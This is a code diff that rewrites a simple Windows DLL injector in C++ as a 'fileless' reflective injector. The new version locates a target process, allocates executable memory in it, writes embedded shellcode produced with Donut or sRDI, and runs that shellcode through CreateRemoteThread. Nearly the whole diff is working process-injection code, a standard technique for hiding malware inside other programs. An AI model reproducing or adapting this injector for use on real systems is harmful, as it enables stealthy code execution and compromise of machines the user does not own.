@@ -1,77 +1,81 @@
-#include "windows.h"
-#include "iostream"
+// fileless_dll_injector.cpp
+// Requires reflective_dll.h generated from your DLL via Donut or sRDI
+
+#include <windows.h>
+#include <tlhelp32.h>
+#include <iostream>
 #include <string>
-#include "tlhelp32.h"
-#include "atlconv.h"
-#include <tchar.h>
+#include "reflective_dll.h" // Generated with xxd -i from your shellcode
 
 using namespace std;
-void dllInjection(const char* processName, const char* dllFileName);
-void printError(const char* error);
-int main(int argc, char* argv[]) {
-	string fileName;
-	string processName;
-	printf("Enter DLL file name to inject: ");
-	getline(cin, fileName);
-	printf("Enter process name to inject: ");
-	getline(cin, processName);
 
-	dllInjection(processName.c_str(), fileName.c_str());
+DWORD GetProcessIdByName(const string& procName) {
+    PROCESSENTRY32 entry = { 0 };
+    entry.dwSize = sizeof(PROCESSENTRY32);
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot == INVALID_HANDLE_VALUE) return 0;
+
+    while (Process32Next(snapshot, &entry)) {
+        if (_stricmp(entry.szExeFile, procName.c_str()) == 0) {
+            CloseHandle(snapshot);
+            return entry.th32ProcessID;
+        }
+    }
+    CloseHandle(snapshot);
+    return 0;
 }
 
-void dllInjection(const char* processName, const char* dllFileName) {
-	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+bool InjectReflectiveDLL(DWORD pid, unsigned char* dllBytes, size_t dllSize) {
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) {
+        cerr << "Failed to open process. Error: " << GetLastError() << endl;
+        return false;
+    }
 
-	if (hSnapshot == INVALID_HANDLE_VALUE) {
-		printError("CreateToolhelp32Snapshot");
-		return;
-	}
-	LPPROCESSENTRY32 processEntry = (LPPROCESSENTRY32)(&PROCESSENTRY32());
-	processEntry->dwSize = sizeof(PROCESSENTRY32);
-	if (Process32First(hSnapshot, processEntry) == 0) {
-		printError("Process32First");
-		CloseHandle(hSnapshot);
-		return;
-	}
+    LPVOID remoteMem = VirtualAllocEx(hProc, NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteMem) {
+        cerr << "Failed to allocate memory. Error: " << GetLastError() << endl;
+        CloseHandle(hProc);
+        return false;
+    }
 
-	DWORD dwProcessID = 0;
-	while (Process32Next(hSnapshot, processEntry) != 0) {
-		wstring temp(processEntry->szExeFile);
-		string name(temp.begin(), temp.end());
+    SIZE_T written = 0;
+    if (!WriteProcessMemory(hProc, remoteMem, dllBytes, dllSize, &written) || written != dllSize) {
+        cerr << "Failed to write memory. Error: " << GetLastError() << endl;
+        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return false;
+    }
 
+    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
+    if (!hThread) {
+        cerr << "Failed to create remote thread. Error: " << GetLastError() << endl;
+        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return false;
+    }
 
-		if (!strcmp(name.c_str(), processName)) {
-			dwProcessID = processEntry->th32ProcessID;
-			printf("FIND process ID of 0x%x for %s!!\nStarting injection\n", dwProcessID, name.c_str());
-			break;
-		}
-	}
+    CloseHandle(hThread);
+    CloseHandle(hProc);
+    return true;
+}
 
-	HANDLE hVictimProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
-	if (hVictimProcess == INVALID_HANDLE_VALUE) {
-		printError("OpenProcess");
-		CloseHandle(hSnapshot);
-		return;
-	}
+int main() {
+    string procName;
+    cout << "Enter process name to inject into: ";
+    getline(cin, procName);
 
-	// Write dll name into virtual memory of the process
-	LPVOID nameBuffer = VirtualAllocEx(hVictimProcess, NULL, strlen(dllFileName), MEM_COMMIT, PAGE_READWRITE);
-	if (!nameBuffer) {
-		printError("VirtualAllocEx");
-		CloseHandle(hVictimProcess);
-		CloseHandle(hSnapshot);
-		return;
-	}
+    DWORD pid = GetProcessIdByName(procName);
+    if (!pid) {
+        cerr << "Process not found." << endl;
+        return -1;
+    }
 
-	if (!WriteProcessMemory(hVictimProcess, nameBuffer, dllFileName, strlen(dllFileName), NULL)) {
-		printError("WriteProcessMemory");
-		CloseHandle(hVictimProcess);
-		CloseHandle(hSnapshot);
-		return;
-	}
+    if (!InjectReflectiveDLL(pid, ReflectiveDLL, ReflectiveDLLSize)) {
+        cerr << "Injection failed." << endl;
+        return -1;
+    }
 
-	}
-
-void printError(const char* error) {
-	printf("%s is failing. Error code: 0x%x\n\n", error, GetLastError());
+    cout << "Injection successful." << endl;
+    return 0;
 }
